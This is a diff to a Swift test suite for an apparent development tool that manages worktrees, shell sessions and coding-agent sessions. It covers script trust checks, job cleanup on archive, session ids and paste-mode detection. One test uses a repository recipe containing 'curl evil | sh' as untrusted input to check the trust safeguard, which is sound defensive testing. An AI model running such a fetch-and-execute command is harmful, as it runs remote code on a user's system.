@@ -301,7 +301,6 @@ private func desk(_ w: World, _ branch: String) async throws -> Worktree {
     #expect(info["trusted"]?.bool == false && info["recipes"]?["commit"]?.string == "also run curl evil | sh")   // shown before trust
     // The file changes while the sheet is open: what was shown is not what would be trusted.
     try "recipe.commit: something else entirely\n".write(toFile: w.repo.path + "/.kelp.yaml", atomically: true, encoding: .utf8)
-    setenv("KELP_APP_EXECUTABLE", testExecutable, 1)
     await #expect(throws: (any Error).self) { _ = try await w.c.call("scripts.trust", .obj(["worktreeId": .string(wt.id), "digest": info["digest"] ?? .null])) }
     #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == false)
     _ = try await trustAsShown(w.c, .string(wt.id))
@@ -469,7 +468,7 @@ private func desk(_ w: World, _ branch: String) async throws -> Worktree {
     #expect(reply.contains("Only Kelp's window"), "\(reply)")
     #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == false)
     // The same call from the program the daemon takes for its app (here: this test process) is accepted.
-    #expect(try await trustAsShown(w.c, .string(wt.id))["trusted"]?.bool != false)
+    _ = try await trustAsShown(w.c, .string(wt.id))
     #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == true)
 }
 
@@ -634,4 +633,44 @@ private let stubbornScript = "trap '' HUP TERM; echo up; while :; do sleep 0.1; 
     _ = try await w.c.call("session.send", .obj(["id": .string(s.id), "text": "one\ntwo"]))
     #expect(try await waitFor(10) { (try await w.c.call("session.read", .obj(["id": .string(s.id)]))).string?.contains("two") == true })
     #expect(!((try await w.c.call("session.read", .obj(["id": .string(s.id)]))).string ?? "").contains("[200~"))
+}
+
+/// A job a shell started in a process group of its own (a server that reloads on SIGHUP) ends with its workspace too.
+@Test func archivingEndsAJobInItsOwnProcessGroup() async throws {
+    let w = try await world(); defer { w.d.stop() }
+    let wt = try await desk(w, "job")
+    let pidFile = tmp().path + "-job.pid"
+    let script = "set -m; (trap '' HUP TERM; while :; do sleep 0.1; done) & echo $! > \(pidFile); echo started; wait"
+    _ = try await w.c.call("session.create", .obj(["worktreeId": .string(wt.id), "command": .string("/bin/bash -c " + IDE.shellWord(script))]))
+    #expect(try await waitFor(10) { FileManager.default.fileExists(atPath: pidFile) })
+    let job = try #require(pid_t((try String(contentsOfFile: pidFile, encoding: .utf8)).trimmingCharacters(in: .whitespacesAndNewlines)))
+    defer { kill(job, SIGKILL) }   // whatever happens, not left behind
+    #expect(getpgid(job) == job)   // its own group: a hangup to the shell's group misses it
+    _ = try await w.c.call("worktree.archive", .obj(["id": .string(wt.id)]))
+    #expect(kill(job, 0) != 0)
+}
+
+/// A fresh restart (no resume) pins an id of its own, never the old session's (Claude Code refuses one already used).
+@Test func aFreshRestartGetsItsOwnSessionId() async throws {
+    var pinned = AgentManifest(id: "pinned", name: "Pinned", command: "/bin/bash", args: ["-c", "sleep 30", "x"])
+    pinned.sessionIdFlag = "--session-id"
+    let w = try await world(agents: [pinned]); defer { w.d.stop() }
+    let wt = try await desk(w, "fresh")
+    let s: Session = try await w.c.call("session.create", .obj(["worktreeId": .string(wt.id), "agent": "pinned"]), as: Session.self)
+    #expect(s.argv.contains(s.id.lowercased()))
+    let r: Session = try await w.c.call("session.restart", .obj(["id": .string(s.id), "resume": false]), as: Session.self)
+    #expect(!r.argv.contains(s.id.lowercased()) && r.argv.contains(r.id.lowercased()))
+    #expect(r.argv.filter { $0 == "--session-id" }.count == 1)
+    _ = try await w.c.call("session.kill", .obj(["id": .string(r.id)]))
+}
+
+/// A program that turns on bracketed paste in two reads (ESC[?20 … 04h) is still known to take pastes.
+@Test func pasteModeSplitAcrossReadsIsSeen() async throws {
+    let w = try await world(); defer { w.d.stop() }
+    let wt = try await desk(w, "split")
+    let script = #"stty -echo; printf '\033[?20'; sleep 0.5; printf '04hready\n'; exec cat -v"#
+    let s: Session = try await w.c.call("session.create", .obj(["worktreeId": .string(wt.id), "command": .string("/bin/bash -c " + IDE.shellWord(script))]), as: Session.self)
+    #expect(try await waitFor(10) { (try await w.c.call("session.read", .obj(["id": .string(s.id)]))).string?.contains("ready") == true })
+    _ = try await w.c.call("session.send", .obj(["id": .string(s.id), "text": "one\ntwo"]))
+    #expect(try await waitFor(10) { (try await w.c.call("session.read", .obj(["id": .string(s.id)]))).string?.contains("[200~one") == true })
 }
